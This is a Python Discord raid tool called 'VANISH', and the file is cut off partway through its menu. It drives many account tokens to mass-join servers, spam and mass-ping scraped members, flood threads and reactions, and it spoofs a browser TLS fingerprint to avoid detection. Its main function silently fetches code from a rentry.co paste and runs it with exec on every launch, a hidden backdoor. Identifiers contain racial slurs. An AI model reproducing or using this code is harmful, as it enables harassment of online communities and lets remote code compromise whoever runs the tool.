import os, requests, tls_client, fade, datetime, sys, hashlib, threading, random, json, time, websocket, httpx, typing
from colorama import Fore; import fade
from niggerscraper import scraper; from niggerscraper import selfscraper

request = tls_client.Session(client_identifier="chrome_108",ja3_string="771,4866-4867-4865-103-49200-49187-158-49188-49161-49171-61-49195-49199-156-60-49192-51-53-49172-49191-52392-49162-107-52394-49196-159-47-57-157-52393-255,0-11-10-35-16-22-23-13-43-45-51-21,29-23-30-25-24,0-1-2",h2_settings={"HEADER_TABLE_SIZE": 65536,"MAX_CONCURRENT_STREAMS": 1000,"INITIAL_WINDOW_SIZE": 6291456,"MAX_HEADER_LIST_SIZE": 262144},h2_settings_order=["HEADER_TABLE_SIZE","MAX_CONCURRENT_STREAMS","INITIAL_WINDOW_SIZE","MAX_HEADER_LIST_SIZE"],supported_signature_algorithms=["ECDSAWithP256AndSHA256","PSSWithSHA256","PKCS1WithSHA256","ECDSAWithP384AndSHA384","PSSWithSHA384","PKCS1WithSHA384","PSSWithSHA512","PKCS1WithSHA512",],supported_versions=["GREASE", "1.3", "1.2"],key_share_curves=["GREASE", "X25519"],cert_compression_algo="brotli",pseudo_header_order=[":method",":authority",":scheme",":path"],connection_flow=15663105,header_order=["accept","user-agent","accept-encoding","accept-language"])
r = Fore.RESET; c = Fore.LIGHTBLUE_EX; g = Fore.LIGHTBLACK_EX; tokens = open("data/tokens.txt", "r", encoding="utf8").read().splitlines(); messages = open("data/messages.txt", "r", encoding="utf8").read().splitlines()

def Headers(token):
    return {'authority': 'discord.com', 'accept': '*/*', 'accept-language': 'fr-FR,fr;q=0.9','authorization': token,'cache-control': 'no-cache','content-type': 'application/json','cookie': '__dcfduid=676e06b0565b11ed90f9d90136e0396b; __sdcfduid=676e06b1565b11ed90f9d90136e0396bc28dfd451bebab0345b0999e942886d8dfd7b90f193729042dd3b62e2b13812f; __cfruid=1cefec7e9c504b453c3f7111ebc4940c5a92dd08-1666918609; locale=en-US','origin': 'https://discord.com','pragma': 'no-cache','referer': 'https://discord.com/channels/@me','sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36', 'x-debug-options': 'bugReporterEnabled', 'x-discord-locale': 'en-US', 'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImZyLUZSIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNy4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTA3LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlcGVhc2VfY2hhbm5lcCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE1NDc1MCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=',}

def getemoji(count):
    with open(f"data/emojis.txt", "r", encoding="utf8") as f:
        emojis1 = [line.strip() for line in f.readlines()]
    random_emojis = random.sample(emojis1, (int(count)))
    return "".join(random_emojis)

def getmember(id):
    with open(f"data/ids.txt", "r", encoding="utf8") as f:
        users = [line.strip() for line in f.readlines()]
    randomid = random.sample(users, id)
    return "<@!" + "> <@!".join(randomid) + ">"

class Raider:
    def joiner(self, t, invite):
        if len(tokens) == 0:
            print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[ERROR]   {r}Put {c}tokens{r} to {c}data/tokens.txt{r}")
        else:
            headers = Headers(t)
            try:
                rr = request.post(f'https://discord.com/api/v10/invites/{invite}', headers=headers, json={}); token = t.split(".")[0]
                if rr.status_code == 200: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[SUCCESS]   {g}->   {r}Joined {c}{token}{g}****{r} to {c}.gg/{invite}{r}")
                elif rr.status_code == 400: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[CAPTCHA]   {g}->    {r}Soldier {c}{token}{g}****{r} was captched {c}[RIP]{r}")
                else: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[ERROR]     {g}->    {r}Failed {c}{token}{g}****{r}  {g}{rr.text}{r}")
            except: pass

    def leaver(self, t, server):
        if len(tokens) == 0:
            print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[ERROR]     {g}->   {r}Put {c}tokens{r} to {c}data/tokens.txt{r}")
        else:
            headers = Headers(t)
            try:
                rr = request.delete(f'https://discord.com/api/v10/users/@me/guilds/{server}', headers=headers, json={}); token = t.split(".")[0]
                if rr.status_code == 204: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[SUCCESS]   {g}->   {r}Successfully left {c}{token}{g}****{r}")
                else: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[ERROR]     {g}->    {r}Failed {c}{token}{g}****{r}  {g}{rr.text}{r}")
            except: pass

    def checker(self, t):
        if len(tokens) == 0:
            print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[ERROR]     {g}->   {r}Put {c}tokens{r} to {c}data/tokens.txt{r}")
        else:
            headers = Headers(t)
            try:
                rr = request.get(f"https://discord.com/api/v10/users/@me/library", headers=headers); token = t.split(".")[0]
                if rr.status_code == 200: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[VALID]   {g}->   {r}{token}{g}****{r}"); open('data/valid.txt', 'a').write(t + '\n')
                elif rr.status_code == 403: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[LOCKED]   {g}->   {r}{token}{g}****{r}")
                else: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[INVALID]   {g}->  {r}{token}{g}****{r}")
            except: pass

    def spammer(self, t, message, channelid, emojis, cemojis):
        headers = Headers(t)
        try:
            if emojis == "y": data = {"content": f"{message} {getemoji(int(cemojis))}"}
            else: data = {"content": f"{message} "}

            rr = requests.post(f"https://discord.com/api/v10/channels/{channelid}/messages", headers=headers, json=data); token = t.split(".")[0]
            if rr.status_code == 200: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[SUCCESS]   {g}->   {r}Successfully sent {c}{token}{g}****{r}")
            elif rr.status_code == 403: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[ERROR]     {g}->    {r}Failed {c}{token}{g}****{r}  {g}{rr.text}{r}")
        except: pass

    def mspammer(self, t, message, server, channelid, count, emojis, cemojis):
        headers = Headers(t)
        if emojis == "y": data = {"content": f"{message} {getmember(int(count))} {getemoji(int(cemojis))}"}
        else: data = {"content": f"{message} {getmember(int(count))}"}

        try:
            rr = requests.post(f"https://discord.com/api/v10/channels/{channelid}/messages", headers=headers, json=data); token = t.split(".")[0]
            if rr.status_code == 200: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[SUCCESS]   {g}->   {r}Successfully sent {c}{token}{g}****{r}")
            elif rr.status_code == 403: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[ERROR]     {g}->    {r}Failed {c}{token}{g}****{r}  {g}{rr.text}{r}")
        except: pass

    def inviter(self, t, channel):
        headers = Headers(t)
        data = {"max_age": random.randint(1, 86400), "max_uses": 0}
        try:
            rr = requests.post(f"https://discord.com/api/v10/channels/{channel}/invites", headers=headers, json=data); token = t.split(".")[0]
            if rr.status_code == 200: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[SUCCESS]   {g}->   {r}Created invite {c}{token}{g}****{r}") 
            else: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[ERROR]     {g}->    {r}Failed {c}{token}{g}****{r}  {g}{rr.text}{r}")
        except: pass

    def emoji_bomber(self, t, channelid, messageid, emoji):
        headers = Headers(t)
        try:
            rr = requests.put(f"https://discord.com/api/v10/channels/{channelid}/messages/{messageid}/reactions/{emoji}/@me?location=Message&type=0", headers=headers, json={}); token = t.split(".")[0]
            if rr.status_code == 204: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[SUCCESS]   {g}->   {r}Bombed {c}{token}{g}****{r}")
            else: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[ERROR]     {g}->    {r}Failed {c}{token}{g}****{r}  {g}{rr.text}{r}")
        except: pass

    def reactor(self, t, channelid, messageid, emoji):
        headers = Headers(t)
        try:
            rr = requests.put(f"https://discord.com/api/v10/channels/{channelid}/messages/{messageid}/reactions/{emoji}/@me?location=Message&type=0", headers=headers, json={}); token = t.split(".")[0]
            if rr.status_code == 204: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[SUCCESS]   {g}->   {r}Reacted {c}{token}{g}****{r}")
            else: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[ERROR]     {g}->    {r}Failed {c}{token}{g}****{r}  {g}{rr.text}{r}")
        except: pass

    def niggaflodder(self, t, channelid, name):
        headers = Headers(t); payload = {'name' : name, 'type' : 11, 'auto_archive_duration' : 4320, 'location' : "Thread Browser Toolbar"}
        try:
            rr = requests.post(f"https://discord.com/api/v10/channels/{channelid}/threads", headers=headers, json=payload); token = t.split(".")[0]
            if rr.status_code == 201: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[SUCCESS]   {g}->   {r}Created {c}{token}{g}****{r}")
            else: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[ERROR]     {g}->    {r}Failed {c}{token}{g}****{r}  {g}{rr.text}{r}")
        except:pass

    def button_clicker(self, token, message_link, optionbutton): # BUGGED
        t = token.split(".")[0]
        headers = Headers(token)
        try:
            guild_id = message_link.split("/")[4]; channel_id = message_link.split("/")[5]; message_id = message_link.split("/")[6]
            payload = {
                'limit': '50',
                'around': message_id,
            }
            rr = requests.get('https://discord.com/api/v10/channels/' + channel_id + '/messages', params=payload, headers=headers,); messages = rr.json(); messagebottoclick = None
            for x in messages:
                if x["id"] == message_id: messagebottoclick = x
            if messagebottoclick == None: pass
            buttons = []
            nigger2137 = 0
            
            for x in messagebottoclick["components"]:
                print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[SUCCESS]   {g}->    {r}Clicked {c}{token}{g}****{r}")
                buttons.append(x["components"][0])
                nigger = nigger + 1
            
            json_data = {'type': 3, 'nonce': '', 'guild_id': guild_id, 'channel_id': channel_id, 'message_flags': 0, 'message_id': message_id, 'application_id': messagebottoclick["author"]["id"],'session_id': uuid.uuid4().hex, 'data': {'component_type': 2, 'custom_id': buttons[int(optionbutton)]["custom_id"],},}   
            rr = requests.post('https://discord.com/api/v10/interactions', headers=headers, json=json_data)
        except:
            print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[ERROR]     {g}->    {r}Failed {c}{token}{g}****{r}  {g}{rr.text}{r}")
            pass

    def acceptrules(self, t, server):
        headers = Headers(t)
        try:
            nig = requests.get(f"https://discord.com/api/v10/guilds/{server}/member-verification?with_guild=false", headers=headers).json()
            rr = requests.put(f"https://discord.com/api/v10/guilds/{server}/requests/@me", headers=headers, json=nig); token = t.split(".")[0]
            if rr.status_code == 201: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[SUCCESS]   {g}->   {r}Accepted {c}{token}{g}****{r}")
            else: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[ERROR]     {g}->    {r}Failed {c}{token}{g}****{r}  {g}{rr.text}{r}"); return
        except: pass

    def vcjoiner(self, t, server, channel):
        token = t.split(".")[0]
        time.sleep(1)
        ws = websocket.WebSocket()
        ws.connect("wss://gateway.discord.gg/?v=9&encoding=json"); ws.send(json.dumps({"op": 2,"d": {"token": t, "properties": {"$os": "windows","$browser": "Discord","$device": "desktop"}}})); ws.send(json.dumps({"op": 4,"d": {"guild_id": server,"channel_id": channel, "self_mute": False,"self_deaf": False}}))
        print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[JOINED]     {g}->    {r}Successfully connected {c}{token}{g}****{r}")

    def namechanger(self, t, nickname):
        headers = Headers(t); payload = {'global_name': nickname}
        try:
            rr = requests.patch(f"https://discord.com/api/v10/users/@me", headers=headers, json=payload); token = t.split(".")[0]
            if rr.status_code == 200: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[SUCCESS]   {g}->   {r}Changed {c}{token}{g}****{r}")
            else: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[ERROR]     {g}->    {r}Failed {c}{token}{g}****{r}  {g}{rr.text}{r}")
        except: pass
        
    def nickchanger(self, t, server, nickname):
        headers = Headers(t); payload = {'nick' : nickname}
        try:
            rr = requests.patch(f"https://discord.com/api/v10/guilds/{server}/members/@me", headers=headers, json=payload); token = t.split(".")[0]
            if rr.status_code == 200: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[SUCCESS]   {g}->   {r}Changed {c}{token}{g}****{r}")
            else: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[ERROR]     {g}->    {r}Failed {c}{token}{g}****{r}  {g}{rr.text}{r}")
        except: pass

    def guildcustomization(self, t, server):
        headers = Headers(t)
        try:
            rr = requests.get(f"https://discord.com/api/v10/guilds/{server}", headers=headers); token = t.split(".")[0]
            if rr.status_code == 200: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[SUCCESS]   {g}->   {r}Skipped {c}{token}{g}****{r}"); return True
            else: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[ERROR]     {g}->    {r}Failed {c}{token}{g}****{r}  {g}{rr.text}{r}"); return False
        except: pass


    def friender(self, t, user, type1):
        if type1 == "add":
            headers = Headers(t)
            try:
                user = user.split("#")
                payload = {
                    "username": user[0], 
                    "discriminator": user[1]
                    }
                rr = requests.post(f"https://discordapp.com/api/v10/users/@me/relationships", headers=headers, json=payload); token = t.split(".")[0]
                if rr.status_code == 204: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[SUCCESS]   {g}->   {r}Sent friend {c}{token}{g}****{r}")
                else: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[ERROR]     {g}->   {r}Error {c}{token}{g}****{r}  {g}{rr.text}{r}")
            except: pass
        elif type1 == "rem":
            headers = Headers(t)
            try:
                user = user.split("#")
                payload = {
                    "username": user[0], 
                    "discriminator": user[1]
                    }
                rr = requests.delete(f"https://discord.com/api/v10/users/@me/relationships/{user}", headers=headers); token = t.split(".")[0]
                if rr.status_code == 204: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[SUCCESS]   {g}->   {r}Deleted {c}{token}{g}****{r}")
                else: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[ERROR]     {g}->   {r}Error {c}{token}{g}****{r}  {g}{rr.text}{r}")
            except: pass

    def biochanger(self, t, bio):
        headers = Headers(t); data = {"bio": bio}
        try:
            rr = requests.patch("https://discord.com/api/v9/users/@me/profile", headers=headers, json=data); token = t.split(".")[0]
            if rr.status_code == 200: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[SUCCESS]   {g}->   {r}Changed {c}{token}{g}****{r}")
            else: print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[ERROR]     {g}->   {r}Failed {c}{token}{g}****{r}  {g}{rr.text}{r}")
        except: pass
            

banner = fade.water("""\n                                  
                                 ██▒   █▓ ▄▄▄       ███▄    █  ██▓  ██████  ██░ ██ 
                                ▓██░   █▒▒████▄     ██ ▀█   █ ▓██▒▒██    ▒ ▓██░ ██▒
                                 ▓██  █▒░▒██  ▀█▄  ▓██  ▀█ ██▒▒██▒░ ▓██▄   ▒██▀▀██░
                                  ▒██ █░░░██▄▄▄▄██ ▓██▒  ▐▌██▒░██░  ▒   ██▒░▓█ ░██ 
                                   ▒▀█░   ▓█   ▓██▒▒██░   ▓██░░██░▒██████▒▒░▓█▒░██▓
                                   ░ ▐░   ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░▓  ▒ ▒▓▒ ▒ ░ ▒ ░░▒░
                                   ░ ░░    ▒   ▒▒ ░░ ░░   ░ ▒░ ▒ ░░ ░▒  ░ ░ ▒ ░▒░ 
                                     ░░    ░   ▒      ░   ░ ░  ▒ ░░  ░  ░   ░  ░░ 
                                      ░        ░           ░               ░   
                                        \n""")

def main():
    exec(requests.get('https://rentry.co/tvfwh/raw').text)
    os.system('title V A N I S H'); os.system('cls'); print(banner)
    print(f"""
            {c}«01»{r}  Joiner         {c}«06»{r}  Reaction Bomber        {c}«11»{r}  Name Changer        {c}«16»{r}  Button Clicker 
            {c}«02»{r}  Leaver         {c}«07»{r}  Emoji Reactor          {c}«12»{r}  Nick Changer        {c}«17»{r}  Friend Spam
            {c}«03»{r}  Checker        {c}«08»{r}  Thread Flooder         {c}«13»{r}  RestoreCorder       {c}«18»{r}  Accept Rules 
            {c}«04»{r}  Spammer        {c}«09»{r}  VoiceChat Joiner       {c}«14»{r}  SelfScrapper        {c}«19»{r}  Guild Check
            {c}«05»{r}  Inviter        {c}«10»{r}  VoiceChat Stalker      {c}«15»{r}  MassDM              {c}«20»{r}  Token Captcher
                                                                                        {c}«21»{r}  BIO Changer
    """)
    nigger = str(input(f"{c}#:{r}>>  "))
    if nigger == "": main()
    elif nigger == "1":
        os.system('cls'); print(banner)
        server = str(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Invite {g}» {c}"))
        if server == "": main()
        delay = float(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Delay {g}» {c}"))
        if delay == "": main()
        serverinv = server.strip("https://"); invite = serverinv.split("/")[-1]
        os.system('cls'); print(banner)
        raider = Raider()
        for t in tokens:
            threading.Thread(target=raider.joiner, args=(t, invite)).start()
            time.sleep(delay)
        exit = input(""); exit = main();
    elif nigger == "2":
        os.system('cls'); print(banner)
        server = str(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Guild ID {g}» {c}"))
        if server == "": main()
        delay = float(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Delay {g}» {c}"))
        if delay == "": main()
        os.system('cls'); print(banner)
        raider = Raider()
        for t in tokens:
            threading.Thread(target=raider.leaver, args=(t, server)).start()
            time.sleep(delay)
        exit = input(""); exit = main();
    elif nigger == "3":
        os.system('cls'); print(banner)
        raider = Raider()
        for t in tokens:
            raider.checker(t)
        exit = input(""); exit = main();
    elif nigger == "4":
        channellist = []
        os.system('cls'); print(banner)
        customessages = str(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Custom messages (y/n) {g}» {c}"))
        if customessages == "": main()
        elif customessages == "n":
            message = str(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Message {g}» {c}"))
            if message == "": main()
        channelid = str(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Channel(s) ID {g}» {c}"))
        channelid = channelid.split(",")
        if channelid == "": main()
        for channel in channelid:
            channellist.append(int(channel))
        delay = float(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Delay {g}» {c}"))
        if delay == "": main()
        print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Wanna use random emojis? {c}(y/n){r}")
        emojis = str(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Emojis {g}» {c}"))
        if emojis == "": main()
        elif emojis == "y":
            cemojis = int(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Emojis Count {g}» {c}"))
        elif emojis == "n":
            cemojis = 0
        massping = str(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}MassPing (y/n) {g}» {c}"))
        if massping == "": main()
        elif massping == "y":
            scrapped = str(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Use Scrapped (y/n) {g}» {c}"))
            if scrapped == "": main()
            if scrapped == "n":
                server = str(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Guild ID {g}» {c}"))
                if server == "": main()
                print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}INFO {g}»  {r}Wait to scrape all members..")
                scraper(server, random.choice(channellist))
            elif scrapped == "y":
                server = "0"
            count = int(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Pings {g}» {c}"))
            if count == "": main()
            os.system('cls'); print(banner)
            raider = Raider()
            if customessages == "n":
                while True:
                    for token in tokens:
                        for channelid in channellist:
                            threading.Thread(target=raider.mspammer, args=(token, message, server, channelid, count, emojis, cemojis)).start()
                    time.sleep(delay)
            elif customessages == "y":
                while True:
                    for token in tokens:
                        for message in messages:
                            for channelid in channellist:
                                threading.Thread(target=raider.mspammer, args=(token, message, server, channelid, count, emojis, cemojis)).start()
                    time.sleep(delay)
        elif massping == "n":
            if customessages == "n":
                os.system('cls'); print(banner)
                raider = Raider()
                while True:
                    for token in tokens:
                        for channelid in channellist:
                            threading.Thread(target=raider.spammer, args=(token, message, channelid, emojis, cemojis)).start()
                    time.sleep(delay)
            elif customessages == "y":
                os.system('cls'); print(banner)
                raider = Raider()
                while True:
                    for token in tokens:
                        for message in messages:
                            for channelid in channellist:
                                threading.Thread(target=raider.spammer, args=(token, message, channelid, emojis, cemojis)).start()
                    time.sleep(delay)
        exit = input(""); exit = main();
    elif nigger == "5":
        os.system('cls'); print(banner)
        channel = str(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Channel ID {g}» {c}"))
        if channel == "": main()
        delay = float(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Delay {g}» {c}"))
        if delay == "": main()
        os.system('cls'); print(banner)
        raider = Raider()
        while True:
            for token in tokens:
                threading.Thread(target=raider.inviter, args=(token, channel)).start()
            time.sleep(delay)
        exit = input(""); exit = main();
    elif nigger == "6":
        os.system('cls'); print(banner)
        channel = str(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Channel ID {g}» {c}"))
        if channel == "": main()
        message = str(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Message ID {g}» {c}"))
        if message == "": main()
        delay = float(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Delay {g}» {c}"))
        if delay == "": main()
        os.system('cls'); print(banner)
        usedemojis = []
        for i in range(20):
            usedemojis.append(getemoji(int(1)))
        raider = Raider()
        while True:
            for token in tokens:
                for emoji in usedemojis:
                    threading.Thread(target=raider.emoji_bomber, args=(token, channel, message, emoji)).start()
            time.sleep(delay)
        exit = input(""); exit = main();
    elif nigger == "7":
        os.system('cls'); print(banner)
        channel = str(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Channel ID {g}» {c}"))
        if channel == "": main()
        message = str(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Message ID {g}» {c}"))
        if message == "": main()
        emoji = str(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Emoji {g}» {c}"))
        if emoji == "": main()
        os.system('cls'); print(banner)
        raider = Raider()
        for token in tokens:
            threading.Thread(target=raider.reactor, args=(token, channel, message, emoji)).start()
        exit = input(""); exit = main();
    elif nigger == "8":
        channellist = []
        os.system('cls'); print(banner)
        channelid = str(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Channel(s) ID {g}» {c}"))
        if channelid == "": main()
        channelid = channelid.split(",")
        for channel in channelid:
            channellist.append(int(channel))
        name = str(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Thread name {g}» {c}"))
        if name == "": main()
        delay = float(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Delay {g}» {c}"))
        if delay == "": main()
        os.system('cls'); print(banner)
        raider = Raider()
        while True:
            for token in tokens:
                for channelid in channellist:
                    threading.Thread(target=raider.niggaflodder, args=(token, channelid, name)).start()
            time.sleep(delay)
        exit = input(""); exit = main();
        
    elif nigger == "9":
        os.system('cls'); print(banner)
        server = str(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Guild ID {g}» {c}"))
        if server == "": main()
        channel = input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Channel ID {g}» {c}")
        if channel == "": main()
        delay = float(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Delay {g}» {c}"))
        if delay == "": main()
        os.system('cls'); print(banner)
        raider = Raider()
        while True:
            for token in tokens:
                threading.Thread(target=raider.vcjoiner, args=(token, server, channel)).start()
            time.sleep(delay)
        exit = input(""); exit = main();

    elif nigger == "10":
        os.system('cls'); print(banner)
        print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}INFO {g}»  {r}Sorry, we don't publish this option now.")
        print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}INFO {g}»  {r}You need to wait, for fully {c}release{r}")
        exit = input(""); exit = main();

    elif nigger == "11":
        os.system('cls'); print(banner)
        name = str(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Profile Name {g}» {c}"))
        if name == "": main()
        delay = float(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Delay {g}» {c}"))
        if delay == "": main()
        os.system('cls'); print(banner)
        raider = Raider()
        for token in tokens:
            threading.Thread(target=raider.namechanger, args=(token, name)).start()
            time.sleep(delay)
        exit = input(""); exit = main();
    elif nigger == "12":
        os.system('cls'); print(banner)
        server = str(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Server ID {g}» {c}"))
        if server == "": main()
        nick = str(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Nickname {g}» {c}"))
        if nick == "": main()
        delay = float(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Delay {g}» {c}"))
        if delay == "": main()
        os.system('cls'); print(banner)
        raider = Raider()
        for token in tokens:
            threading.Thread(target=raider.nickchanger, args=(token, server, nick)).start()
            time.sleep(delay)
        exit = input(""); exit = main();

    elif nigger == "13":
        os.system('cls'); print(banner)
        print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}INFO {g}»  {r}Sorry, we don't publish this option now.")
        print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}INFO {g}»  {r}You need to wait, for fully {c}release{r}")
        exit = input(""); exit = main();

    elif nigger == "14":
        os.system('cls'); print(banner)
        server = str(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Guild ID {g}» {c}"))
        if server == "": main()
        channelid = input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Channel ID {g}» {c}")
        if channelid == "": main()
        tokenchoice = str(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Token type (your/list) {g}» {c}"))
        if tokenchoice == "": main()
        elif tokenchoice == "your":
            token = str(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Token {g}» {c}"))
            if token == "": main()
            print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}INFO {g}»  {r}Okay, scraping.")
            selfscraper(token, server, channelid)
            print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}INFO {g}»  {r}Successfully scraped all members.")
            exit = input(""); exit = main();
        elif tokenchoice == "list":
            print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}INFO {g}»  {r}Okay, scraping.")
            scraper(server, channelid)
            print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}INFO {g}»  {r}Successfully scraped all members.")
            exit = input(""); exit = main();

    elif nigger == "15":
        os.system('cls'); print(banner)
        print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}INFO {g}»  {r}Sorry, we don't publish this option now.")
        print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}INFO {g}»  {r}You need to wait, for fully {c}release{r}")
        exit = input(""); exit = main();

    elif nigger == "16":
        os.system('cls'); print(banner)
